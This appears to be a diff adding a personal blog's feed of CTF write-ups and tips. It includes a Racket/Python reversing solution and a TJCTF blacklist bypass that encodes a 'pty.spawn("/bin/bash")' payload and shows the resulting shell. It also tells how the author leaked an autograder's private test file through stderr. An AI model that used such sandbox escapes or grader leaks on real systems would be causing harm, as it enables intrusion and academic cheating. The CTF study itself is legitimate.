+                                                                          <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g465</span><span class="p">)</span>
+                                                                            <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g466</span><span class="p">)</span>
+                                                                              <span class="p">(((((</span><span class="nv">fun4</span>
+                                                                                   <span class="nv">g465</span><span class="p">)</span>
+                                                                                  <span class="nv">g466</span><span class="p">)</span>
+                                                                                 <span class="nv">sel3</span><span class="p">)</span>
+                                                                                <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g490</span><span class="p">)</span>
+                                                                                  <span class="p">(</span><span class="nv">X</span>
+                                                                                   <span class="p">((</span><span class="nv">g464</span>
+                                                                                     <span class="p">((</span><span class="nv">fun2</span>
+                                                                                       <span class="nv">g465</span><span class="p">)</span>
+                                                                                      <span class="nv">g466</span><span class="p">))</span>
+                                                                                    <span class="nv">g466</span><span class="p">))))</span>
+                                                                               <span class="nv">sel2</span><span class="p">)))))</span>
+                                                                       <span class="nv">g310</span><span class="p">)</span>
+                                                                      <span class="nv">apply-2-times</span><span class="p">))</span>
+                                                                    <span class="p">(((</span><span class="nv">Y</span>
+                                                                       <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g512</span><span class="p">)</span>
+                                                                         <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g513</span><span class="p">)</span>
+                                                                           <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g514</span><span class="p">)</span>
+                                                                             <span class="p">(((((</span><span class="nv">fun4</span>
+                                                                                  <span class="nv">g513</span><span class="p">)</span>
+                                                                                 <span class="nv">g514</span><span class="p">)</span>
+                                                                                <span class="nv">sel3</span><span class="p">)</span>
+                                                                               <span class="p">(</span><span class="err">λ</span> <span class="p">(</span><span class="nv">g538</span><span class="p">)</span>
+                                                                                 <span class="p">(</span><span class="nv">X</span>
+                                                                                  <span class="p">((</span><span class="nv">g512</span>
+                                                                                    <span class="p">((</span><span class="nv">fun2</span>
+                                                                                      <span class="nv">g513</span><span class="p">)</span>
+                                                                                     <span class="nv">g514</span><span class="p">))</span>
+                                                                                   <span class="nv">g514</span><span class="p">))))</span>
+                                                                              <span class="nv">sel2</span><span class="p">)))))</span>
+                                                                      <span class="nv">g311</span><span class="p">)</span>
+                                                                     <span class="nv">apply-2-times</span><span class="p">))</span>
+                                                                   <span class="p">(</span><span class="nv">X</span> <span class="nv">g312</span><span class="p">))))</span>
+                                                               <span class="nv">sel2</span><span class="p">)))))))</span>
+                                                   <span class="nv">sel2</span><span class="p">)</span>
+                                                  <span class="nv">g299</span><span class="p">)</span>
+                                                 <span class="nv">g300</span><span class="p">)</span>
+                                                <span class="nv">sel2</span><span class="p">)))</span>
+                                           <span class="nv">fun31</span><span class="p">)</span>
+                                          <span class="nv">abg</span><span class="p">)))</span>
+                                     <span class="p">(</span><span class="nv">g179</span> <span class="p">(</span><span class="nv">ord</span> <span class="nv">g188</span><span class="p">)))</span>
+                                    <span class="p">(</span><span class="nv">g179</span> <span class="p">(</span><span class="nv">ord</span> <span class="nv">g189</span><span class="p">))))))))</span>
+                              <span class="p">(</span><span class="nv">X</span> <span class="nv">g187</span><span class="p">)))))</span>
+                       <span class="p">(</span><span class="nb">read</span> <span class="nv">g176</span> <span class="mi">1</span><span class="p">))</span>
+                      <span class="p">(</span><span class="nb">read</span> <span class="nv">g177</span> <span class="mi">1</span><span class="p">))))))</span>
+              <span class="mi">0</span><span class="p">)</span>
+             <span class="nv">sel2</span><span class="p">)))))</span>
+    <span class="p">(</span><span class="nb">open</span> <span class="s">"./flag.txt"</span><span class="p">))</span>
+   <span class="p">(</span><span class="nb">open</span> <span class="nv">__file__</span><span class="p">))</span>
+  <span class="p">(</span><span class="nv">read-1000</span> <span class="p">(</span><span class="nb">open</span> <span class="nv">__file__</span><span class="p">)))</span>
+ <span class="nv">main</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><a name="end-of-output"></a>As you can see, even with all of this pattern matching, we don’t have much in
+terms of readable code. We see that we are reading <code class="language-plaintext highlighter-rouge">lambda.py</code> (which is <code class="language-plaintext highlighter-rouge">__file__</code>) and <code class="language-plaintext highlighter-rouge">flag.txt</code>
+character by character (note that parameters <code class="language-plaintext highlighter-rouge">g176</code> and <code class="language-plaintext highlighter-rouge">g177</code> refer to <code class="language-plaintext highlighter-rouge">./flag.txt</code> and <code class="language-plaintext highlighter-rouge">lambda.py</code>
+respectively if you follow the lambdas). We do addition and multiplication with some numbers and get some
+result somehow, but not much else is known.</p>
+
+<h3 id="dynamic-analysis">Dynamic analysis</h3>
+
+<p>Here comes dynamic analysis to the rescue! We know that <code class="language-plaintext highlighter-rouge">lambda.py</code> outputs a number, and by changing
+<code class="language-plaintext highlighter-rouge">flag.txt</code>, we change the output. Maybe by knowing the arguments given to the arithmetic operations, we
+can hope to glean some information on what the program actually does.</p>
+
+<p>So I added <code class="language-plaintext highlighter-rouge">printf</code> statements in the Python interpreter. I downloaded Python 3.5.10 source and made a few
+modifications. The first thing to do was to find where addition and multiplication were implemented.
+Python is special in that there is no limit to the size of <code class="language-plaintext highlighter-rouge">long</code> integers, so I know that addition and
+multiplication are not trivially implemented.</p>
+
+<p>After a bit of searching, I find what I’m looking for in <code class="language-plaintext highlighter-rouge">Objects/longobject.c</code> in functions <code class="language-plaintext highlighter-rouge">long_mul(a,
+b)</code> and <code class="language-plaintext highlighter-rouge">long_add(a, b)</code>. I add the following lines:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Addition</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"DEBUG: (+ %lu %lu) = %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+       <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">b</span><span class="p">),</span>
+       <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">b</span><span class="p">));</span>
+<span class="c1">// Multiplication</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"DEBUG: (* %lu %lu) = %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+       <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">b</span><span class="p">),</span>
+       <span class="n">MEDIUM_VALUE</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nf">MEDIUM_VALUE</span><span class="p">(</span><span class="n">b</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>They are added within the “fast multiplication”/”fast addition” if statements.</p>
+
+<p>Also note that we call the <code class="language-plaintext highlighter-rouge">ord</code> function, so we add a <code class="language-plaintext highlighter-rouge">printf</code> in <code class="language-plaintext highlighter-rouge">Python/bltinmodules.c</code>
+<code class="language-plaintext highlighter-rouge">builtin_ord(module, c)</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ord</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">PyBytes_AS_STRING</span><span class="p">(</span><span class="n">c</span><span class="p">));</span>
+<span class="c1">// Add following line after above line</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"DEBUG: ORD('%c') = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">PyBytes_AS_STRING</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">ord</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We build this new interpreter and run <code class="language-plaintext highlighter-rouge">python lambda.py</code> yet again. And for brevity’s sake I’m not going
+to include console output because it is 6k lines long.</p>
+
+<p>Unfortunately I didn’t find the output to be too useful. There was just too much noise. And the fact that
+the program only ever added 1 in addition (as far as I tested) probably didn’t help.</p>
+
+<h2 id="brute-force">Brute force</h2>
+
+<p>After a while, <a href="https://twitter.com/nneonneo">someone in the ctf team I’m in</a> uploaded their work in
+pattern matching, only it was in python. They weren’t done yet, but I noticed something interesting in the
+main function:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./flag.txt'</span><span class="p">)</span>
+<span class="n">b</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'lambda.py'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">h</span><span class="p">):</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">k</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">g</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">main</span><span class="p">(</span><span class="n">g</span><span class="o">*</span><span class="mi">256</span><span class="o">+</span><span class="p">(</span><span class="k">lambda</span> <span class="n">g</span><span class="p">:</span> <span class="n">g</span><span class="p">(</span><span class="s">'insert more lambdas here'</span><span class="p">)),</span> <span class="n">X</span><span class="p">(</span><span class="n">h</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Did you catch it? The variable <code class="language-plaintext highlighter-rouge">g</code> functions as an accumulator. Each time we iterate, we shift <code class="language-plaintext highlighter-rouge">g</code> to the
+left by 8 bits and add some result from a function that contains a character from <code class="language-plaintext highlighter-rouge">flag.txt</code> and
+<code class="language-plaintext highlighter-rouge">lambda.py</code>. This suggests that each byte of <code class="language-plaintext highlighter-rouge">g</code> is independent of any other byte. Thus we can brute force
+each byte. To make things faster, we test bytes against the first 24 bytes of <code class="language-plaintext highlighter-rouge">lambda.py</code>, since that’s
+what <code class="language-plaintext highlighter-rouge">open('lambda.py', 'r').read(1)</code> does. The script for my solution is as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">subprocess</span> <span class="k">as</span> <span class="n">sub</span>
+
+<span class="n">ENCRYPTED_FLAG</span> <span class="o">=</span> <span class="mi">2692665569775536810618960607010822800159298089096272924</span>
+<span class="n">ENCRYPTED_FLAG</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">'{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ENCRYPTED_FLAG</span><span class="p">))</span>
+
+<span class="n">FLAG_FILE</span> <span class="o">=</span> <span class="s">'flag.txt'</span>
+<span class="n">LAMBDA_PY</span> <span class="o">=</span> <span class="s">'lambda.py'</span>         <span class="c1"># we will be overwrite this file
+</span><span class="n">COPY_LAMBDA</span> <span class="o">=</span> <span class="s">'lambda.py.bak'</span>   <span class="c1"># backup file for copying and pasting each character
+</span>
+<span class="n">WHAT_WE_HAVE</span> <span class="o">=</span> <span class="s">'actf{3p1c_0n'</span>   <span class="c1"># the script runs pretty slowly; don't want to wait that much
+# actf{3p1c_0n3_l1n3r_95}
+</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'solved: %s'</span> <span class="o">%</span> <span class="n">WHAT_WE_HAVE</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">COPY_LAMBDA</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">PLAINTEXT</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ENCRYPTED_FLAG</span><span class="p">))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">WHAT_WE_HAVE</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">ENCRYPTED_FLAG</span><span class="p">)):</span>
+    <span class="n">solved</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">LAMBDA_PY</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">PLAINTEXT</span><span class="p">[</span><span class="n">i</span><span class="p">])]))</span>
+
+    <span class="c1"># try most sensible ascii values (zero doesn't work and errors out)
+</span>    <span class="k">for</span> <span class="n">flag_i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">FLAG_FILE</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">flag_i</span><span class="p">]))</span>
+
+        <span class="n">res</span> <span class="o">=</span> <span class="n">sub</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'python'</span><span class="p">,</span> <span class="s">'lambda-annotated.py'</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ENCRYPTED_FLAG</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+            <span class="k">if</span> <span class="n">flag_i</span> <span class="o">&gt;</span> <span class="mi">126</span> <span class="ow">or</span> <span class="n">flag_i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">flag_i</span><span class="p">))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">flag_i</span><span class="p">))</span>
+            <span class="n">solved</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">solved</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Could not solve this character. Skipping.'</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>A slight issue occured where the character <code class="language-plaintext highlighter-rouge">3</code> in <code class="language-plaintext highlighter-rouge">0n3</code> was output as <code class="language-plaintext highlighter-rouge">0x3</code>, and the character next to it
+couldn’t be solved, leading me to guess those characters.</p>]]></content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="python" /><category term="racket" /><category term="lambda" /><summary type="html"><![CDATA[lambda lambda [rev 130 points] lambda lambda lambda…. lambda? 2692665569775536810618960607010822800159298089096272924 hint: Ever hear about lambda calculus?]]></summary></entry><entry><title type="html">Timed - tjctf</title><link href="/writeup/2020/05/26/timed-tjctf.html" rel="alternate" type="text/html" title="Timed - tjctf" /><published>2020-05-26T20:23:00-07:00</published><updated>2020-05-26T20:23:00-07:00</updated><id>/writeup/2020/05/26/timed-tjctf</id><content type="html" xml:base="/writeup/2020/05/26/timed-tjctf.html"><![CDATA[<p>This one is a cool blacklist bypass. It’s pretty simple. You are presented a
+text interface asking you to enter a python command.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
+</span></code></pre></div></div>
+
+<p>Trying some simple functions seem to work fine, but….</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
+print(1)
+Runtime: 1.09672546387e-05
+
+Type a command to time it!
+import os
+Hey, no hacking!
+</span></code></pre></div></div>
+
+<p>…there seems to be a blacklist of characters that get screened before the
+command is run. We must obfuscate it somehow. By digging around, we can see
+exactly what is in the blacklist and what isn’t in the blacklist. Most
+peculiarly, <code class="language-plaintext highlighter-rouge">timeit</code> is <strong>NOT</strong> in the blacklist.</p>
+
+<blockquote>
+  <p>Sidenote: it is hinted that <code class="language-plaintext highlighter-rouge">timeit</code> could be a possibility because it is
+visible in the source whenever we provide invalid python code for the program
+to execute.</p>
+</blockquote>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
+arst
+Traceback (most recent call last):
+</span><span class="gp">  File "/timed.py", line 36, in &lt;module&gt;</span><span class="w">
+</span><span class="go">    time1=t.timeit(1)
+  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
+    timing = self.inner(it, self.timer)
+</span><span class="gp">  File "&lt;timeit-src&gt;</span><span class="s2">", line 6, in inner
+</span><span class="go">    arst
+NameError: global name 'arst' is not defined
+Runtime: 0
+
+Type a command to time it!
+12.,,
+Traceback (most recent call last):
+</span><span class="gp">  File "/timed.py", line 31, in &lt;module&gt;</span><span class="w">
+</span><span class="go">    t=timeit.Timer(res)
+  File "/usr/lib/python2.7/timeit.py", line 129, in __init__
+    compile(setup + '\n' + stmt, dummy_src_name, "exec")
+</span><span class="gp">  File "&lt;timeit-src&gt;</span><span class="s2">", line 2
+</span><span class="go">    12.,,
+        ^
+SyntaxError: invalid syntax
+</span></code></pre></div></div>
+
+<p>We can do something like the following in order to trick the program into
+executing blacklisted commands:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We want to execute the following python
+</span><span class="n">want_exec</span> <span class="o">=</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="c1"># So we obfuscate it a bit
+</span><span class="n">obfuscated</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">want_exec</span><span class="p">]</span>
+<span class="c1"># and we can just reverse it using a join-map
+</span><span class="k">assert</span> <span class="n">want_exec</span> <span class="o">==</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">obfuscated</span><span class="p">))</span>
+
+<span class="c1"># Payload:
+</span><span class="n">timeit</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="p">[</span><span class="mi">105</span><span class="p">,</span> <span class="p">...])))</span>
+</code></pre></div></div>
+
+<p>By pasting the payload into the program, we get a shell:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
+timeit(''.join(map(chr, [105, ...])))
+bash: /root/.bashrc: Permission denied
+</span><span class="gp">nobody@c51f99923c23:/$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ls
+bin   dev  flag.txt  lib    media  opt   root  sbin  sys       tmp  var
+boot  etc  home      lib64  mnt    proc  run   srv   timed.py  usr
+</span><span class="gp">nobody@c51f99923c23:/$</span><span class="w"> </span><span class="nb">cat </span>flag.txt
+<span class="go">cat flag.txt
+tjctf{iTs_T1m3_f0r_a_flaggg}
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="python" /><summary type="html"><![CDATA[This one is a cool blacklist bypass. It’s pretty simple. You are presented a text interface asking you to enter a python command.]]></summary></entry><entry><title type="html">Taking advantage of output dumping for a Gradescope programming assignment</title><link href="/writeup/2020/05/08/gradescope-hw-exploits.html" rel="alternate" type="text/html" title="Taking advantage of output dumping for a Gradescope programming assignment" /><published>2020-05-08T00:00:00-07:00</published><updated>2020-05-08T00:00:00-07:00</updated><id>/writeup/2020/05/08/gradescope-hw-exploits</id><content type="html" xml:base="/writeup/2020/05/08/gradescope-hw-exploits.html"><![CDATA[<blockquote>
+  <p>An old story I’ve been saving up.</p>
+</blockquote>
+
+<p>So I submitted my CS 221 Intro to Data Structures and Algorithms programming
+assignment and found something very peculiar. I couldn’t figure out why one of
+the tests were failing. The test in question was one of those private tests
+that students don’t have access to, to prevent students from simply outputting
+the solution when given a certain input. And to that, I was also pretty sure
+that I had followed the assignment to the tee. And thus I wanted to find out
+what was the exact input to the test. Luckily for me, the designer for this
+assignment left out a point to exploit.</p>
+
+<p>The automated grader would first take the uploaded files and compile them with
+the on-board test suite, and then run the tests. After running the tests, it
+would dump the output from <code class="language-plaintext highlighter-rouge">valgrind</code> to give the student some indication on
+memory usage and leakage. The problem here is that <code class="language-plaintext highlighter-rouge">valgrind</code> doesn’t only
+print memory usage and leakage. It also prints anything in <code class="language-plaintext highlighter-rouge">stdout</code> and
+<code class="language-plaintext highlighter-rouge">stderr</code>. I also noticed that the <code class="language-plaintext highlighter-rouge">Makefile</code> build was echoed on screen. I not
+only had the name of the file for private testing, but also the means for
+printing anything out. Which means:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;fstream&gt;
+#include &lt;sstream&gt;
+#include &lt;iostream&gt;
+</span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">someFunctionThatOnlyRunsOnce</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">ifstream</span> <span class="n">is</span><span class="p">(</span><span class="s">"testgrid.cpp"</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">is</span><span class="p">.</span><span class="n">is_open</span><span class="p">())</span> <span class="p">{</span>
+		<span class="n">stringstream</span> <span class="n">ss</span><span class="p">;</span>
+		<span class="n">ss</span> <span class="o">&lt;&lt;</span> <span class="n">is</span><span class="p">.</span><span class="n">rdbuf</span><span class="p">();</span>
+		<span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="n">ss</span><span class="p">.</span><span class="n">str</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After compiling to make sure nothing breaks, I uploaded it for the grader to
+run and got my results back. I found that the bug was not in my code, but in
+the form of a hidden requirement. The goal of this assignment was to work with
+a grid in the form of 2D linked lists. The hidden requirement was that the
+tests expected the program to take row and column input that were larger than
+the actual grid. According to the test, the actual grid should be infinite,
+with the rows and columns cycling. To adhere to these new requirements, I would
+simply take the inputs to the function and <code class="language-plaintext highlighter-rouge">(mod &lt;row-size|col-size&gt;)</code>. This
+was not specified in the assignment details.</p>
+
+<p>And so I went and made the changes. All was well.</p>
+
+<h2 id="aftermath">Aftermath</h2>
+
+<p>A few hours after I finished working on this programming assignment, there was
+an announcement about the homework that talked about this hidden requirement.
+The things I do for marks….</p>]]></content><author><name></name></author><category term="writeup" /><category term="writeup" /><category term="c++" /><category term="assignment" /><summary type="html"><![CDATA[An older story about exploiting the design of an autograder for a marginal increase in marks, that didn't matter in the slightest in the end.]]></summary></entry><entry><title type="html">gstreamer tips and tricks</title><link href="/gstreamer/2020/03/18/gstreamer-tricks.html" rel="alternate" type="text/html" title="gstreamer tips and tricks" /><published>2020-03-18T14:45:00-07:00</published><updated>2020-03-18T14:45:00-07:00</updated><id>/gstreamer/2020/03/18/gstreamer-tricks</id><content type="html" xml:base="/gstreamer/2020/03/18/gstreamer-tricks.html"><![CDATA[<h2 id="streaming-video-from-internet-to-devvideo0">Streaming video from internet to /dev/video0</h2>
+
+<p>For cases where you want to use your desktop to do face-to-face meetings with
+others but don’t want to go out and buy a webcam, this is for you.</p>
+
+<p>Prerequisites:</p>
+
+<ul>
+  <li>A phone</li>
+  <li>A linux machine with v4l2loopback installed</li>
+  <li>gstreamer</li>
+</ul>
+
+<p>To start, install an app on your phone that streams video from the phone’s IP
+address (for Android users, there is IP Webcam). Start the server up. Pay
+attention to the URL that streams raw video (for IP Webcam, it is <code class="language-plaintext highlighter-rouge">/video</code>).</p>
+
+<p>To activate the v4l2loopback kernel module, run the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>modprobe v4l2loopback
+</code></pre></div></div>
+
+<p>You may notice that it automatically creates a new loopback device (usually
+<code class="language-plaintext highlighter-rouge">/dev/video0</code> if you don’t have other webcams plugged in).</p>
+
+<p>Run gstreamer:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gst-launch-0.10 souphttpsrc <span class="nv">location</span><span class="o">=</span><span class="s2">"http://&lt;URL&gt;/video"</span> is-live<span class="o">=</span><span class="nb">true</span> <span class="o">!</span>
+	multidec <span class="o">!</span> decodebin <span class="o">!</span> v4l2sink <span class="nv">device</span><span class="o">=</span>/dev/video0
+</code></pre></div></div>
+
+<p><strong>Note:</strong> You can replace the video URL with any video you like and have that
+video stream into <code class="language-plaintext highlighter-rouge">/dev/video0</code>.</p>
+
+<h2 id="streaming-audio-from-internet-to-computer">Streaming audio from internet to computer</h2>
+
+<p>For cases where you don’t just want video from your phone, but audio as well,
+this is for you.</p>
+
+<p>Prerequisites:</p>
+
+<ul>
+  <li>Everything above that concerns a phone and gstreamer</li>
+</ul>
+
+<p>This time you don’t need to use v4l2loopback since we are streaming the audio
+directly to our device. You will be able to hear the audio in your headphones.</p>
+
+<p>After setting up the server for your phone, pay attention to the URL for the
+audio streams (there are 2/3 for IP Webcam: <code class="language-plaintext highlighter-rouge">/audio.wav</code>, <code class="language-plaintext highlighter-rouge">/audio.opus</code>,
+<code class="language-plaintext highlighter-rouge">/audio.aac</code>, depending on if your device supports them; we will use
+<code class="language-plaintext highlighter-rouge">/audio.wav</code>).</p>
+
+<p>Run gstreamer:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gst-launch-0.10 souphttpsrc <span class="nv">location</span><span class="o">=</span><span class="s2">"http://&lt;URL&gt;/audio.wav"</span> is-live<span class="o">=</span><span class="nb">true</span> <span class="o">!</span>
+	decodebin <span class="o">!</span> autoaudiosink
+</code></pre></div></div>
+
+<h2 id="streaming-audio-from-pulseaudio-device-to-computer">Streaming audio from PulseAudio device to computer</h2>
+
+<p>For the cases where everyone tells you to use
+<a href="https://meet.google.com">meet.google.com</a> for meetings and you have a USB microphone
+and want to join but for some reason Google doesn’t recognize your USB
+microphone but for some other reason recognizes the sounds your device makes
+(system monitor) <strong>even though</strong> other sites that test microphone have no
+trouble recognizing both the system monitor and the USB microphone at the same
+time.</p>
+
+<p>Prerequisites:</p>
+
+<ul>
+  <li>A USB microphone</li>
+  <li>PulseAudio system</li>
+  <li>gstreamer</li>
+</ul>
+
+<p>Plug in your microphone. We have to find the device’s name. Run the command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pactl list | <span class="nb">grep</span> <span class="nt">-A2</span> <span class="s1">'Source #'</span> | <span class="nb">grep</span> <span class="s1">'Name: '</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">" "</span> <span class="nt">-f2</span>
+</code></pre></div></div>
+
+<p>You will see a couple of devices listed. Pick the one you think is correct.
+Usually the correct one is prefixed with <code class="language-plaintext highlighter-rouge">alsa_input</code>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">alsa_input.usb-BLUE_MICROPHONE_Blue_Snowball_SUGA_2019_11_14_29386-00.mono-fallback
+alsa_output.pci-0000_00_1b.0.analog-stereo.monitor
+</span></code></pre></div></div>
+
+<p>Copy the entire string and run the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gst-launch-0.10 pulsesrc <span class="nv">device</span><span class="o">=</span><span class="s2">"&lt;YOUR DEVICE NAME HERE&gt;"</span> <span class="o">!</span> autoaudiosink
+</code></pre></div></div>]]></content><author><name></name></author><category term="gstreamer" /><category term="gstreamer" /><category term="linux" /><category term="command-line" /><summary type="html"><![CDATA[Some gstreamer tips and tricks for the soul]]></summary></entry><entry><title type="html">The Prophet - TetCTF</title><link href="/writeup/2020/01/08/the-prophet-tetctf.html" rel="alternate" type="text/html" title="The Prophet - TetCTF" /><published>2020-01-08T07:12:00-08:00</published><updated>2020-01-08T07:12:00-08:00</updated><id>/writeup/2020/01/08/the-prophet-tetctf</id><content type="html" xml:base="/writeup/2020/01/08/the-prophet-tetctf.html"><![CDATA[<p>This was a fun one. We start off with a web page and get a foothold with an
+arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary
+Code Execution in the web debugger.</p>
+
+<p>On the webpage, we are presented with a hyperlink with the text <code class="language-plaintext highlighter-rouge">Read some
+oracle here</code>. Clicking the hyperlink brings us to 5 web pages
+<code class="language-plaintext highlighter-rouge">/read/oracle/[1-5].txt</code>. One of them, <code class="language-plaintext highlighter-rouge">1.txt</code>, says the following:</p>
+
+<blockquote>
+  <p>Flag is in random folder at /, but what is it name? Who know 🤷‍♂️ 
